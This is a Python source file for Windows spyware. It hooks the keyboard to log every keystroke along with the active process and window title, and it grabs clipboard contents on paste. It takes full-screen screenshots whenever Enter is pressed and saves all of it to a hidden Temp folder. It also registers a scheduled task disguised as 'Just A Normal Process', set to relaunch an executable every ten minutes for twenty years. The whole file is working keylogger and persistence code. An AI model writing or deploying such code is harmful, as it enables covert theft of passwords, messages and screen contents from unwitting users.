from ctypes import byref, create_string_buffer, c_ulong, windll
from io import StringIO

import os
import pythoncom
import pyWinhook as pyHook
import sys
import time
import win32clipboard
import base64
import win32api
import win32con
import win32gui
import win32ui
import uuid
import subprocess


TIMEOUT =  60*10

def get_dimensions():
    width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
    height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
    left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
    top = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
    return (width, height, left, top)

def screenshot():
    handle_activewindow = windll.user32.GetForegroundWindow()
    window_title = create_string_buffer(512)
    windll.user32.GetWindowTextA(handle_activewindow, byref(window_title), 512)

    name = window_title.value.decode() + '_' + str(uuid.uuid4())



    desktop_handle = win32gui.GetDesktopWindow()
    width, height, left, top = get_dimensions()

    desktop_devicecontext = win32gui.GetWindowDC(desktop_handle)
    img_devicecontext = win32ui.CreateDCFromHandle(desktop_devicecontext)
    mem_devicecontext = img_devicecontext.CreateCompatibleDC()

    screenshot = win32ui.CreateBitmap()
    screenshot.CreateCompatibleBitmap(img_devicecontext, width, height)
    mem_devicecontext.SelectObject(screenshot)

    mem_devicecontext.BitBlt((0,0), (width, height), img_devicecontext, (left, top), win32con.SRCCOPY)


    path_beginning = os.path.dirname(os.path.realpath(__file__))
    #screenshot.SaveBitmapFile(mem_devicecontext, f'{path_beginning}\Screenshots\{name}.bmp')
    screenshot.SaveBitmapFile(mem_devicecontext, f'C:\\Users\\Admin\\AppData\\Local\\Temp\\Storage\\Screenshots\\{name}.bmp')

    mem_devicecontext.DeleteDC()
    win32gui.DeleteObject(screenshot.GetHandle())


class KeyLogger:
    def __init__(self):
        self.current_window = None

    def get_current_process(self):
        handle_activewindow = windll.user32.GetForegroundWindow()
        pid = c_ulong(0)
        windll.user32.GetWindowThreadProcessId(handle_activewindow, byref(pid))
        process_id = f'{pid.value}'

        executable = create_string_buffer(512)
        process_handle = windll.kernel32.OpenProcess(0x400|0x10, False, pid)
        windll.psapi.GetModuleBaseNameA(process_handle, None, byref(executable), 512)

        window_title = create_string_buffer(512)
        windll.user32.GetWindowTextA(handle_activewindow, byref(window_title), 512)
        try:
            self.current_window = window_title.value.decode()
        except UnicodeDecodeError as e:
            print(f'{e}: window name unknown')

        print('\n', process_id, executable.value.decode(), self.current_window)

        windll.kernel32.CloseHandle(handle_activewindow)
        windll.kernel32.CloseHandle(process_handle)


    def mykeystroke(self,event):
        if event.WindowName != self.current_window:
            self.get_current_process()
        if 32 < event.Ascii < 127:
            print(chr(event.Ascii), end='')
        else:
            if event.Key == 'V':
                win32clipboard.OpenClipboard()
                value = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                print(f'[PASTE] - {value}')
            if event.Ascii == 13:
                print(f'{event.Key}')
                screenshot()
            else:
                print(f'{event.Key}')
        return True


def run():
    save_stdout = sys.stdout
    sys.stdout = StringIO()

    kl = KeyLogger()
    hm = pyHook.HookManager()
    hm.KeyDown = kl.mykeystroke
    hm.HookKeyboard()
    while time.thread_time() < TIMEOUT:
        pythoncom.PumpWaitingMessages()
        
    log = sys.stdout.getvalue()
    sys.stdout = save_stdout
    return log

    

if __name__ == '__main__':
    #path_beginning = os.path.dirname(os.path.realpath(__file__))
    #keystroke_path = path_beginning + "/keystrokes_out.txt"
    keystroke_path = "C:\\Users\\Admin\\AppData\\Local\\Temp\\Storage\\keystrokes_out.txt"
    #Screenshot_Directory = path_beginning + "/Screenshots"
    Screenshot_Directory = "C:\\Users\\Admin\\AppData\\Local\\Temp\\Storage\\Screenshots"
    
    # <insert the task scheduler code here> **grab from github**
    pathname = "C:\\Users\\Admin\\AppData\\Local\\Temp\\Storage"
    if not os.path.exists(pathname):
        os.mkdir(pathname)
        cmd = """
        $action = New-ScheduledTaskAction -Execute "C:\Windows\Smile.exe" 
        $description = "Just A Normal Process"
        $settings = New-ScheduledTaskSettingsSet -DeleteExpiredTaskAfter (New-TimeSpan -Seconds 2)
        $taskName = "SmileYoureOnCamera"
        $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(5) -RepetitionInterval (New-TimeSpan -Minutes 10) -RepetitionDuration (New-TimeSpan -Days (365 * 20))
        Register-ScheduledTask -TaskName $taskName -Description $description -Action $action -Settings $settings -Trigger $trigger | Out-Null
        """
    
        listProcess = [
            "powershell.exe",
            "-NoExit",
            "-NoProfile",
            "-Command",
            cmd
        ]
        subprocess.run(listProcess, check=True)

    if not os.path.exists(Screenshot_Directory):
        os.mkdir(Screenshot_Directory)

    if not os.path.exists(keystroke_path):
        open(keystroke_path, 'w').close()

    if os.path.exists(keystroke_path):
        with open(keystroke_path, 'a') as f:
            f.write(run())


    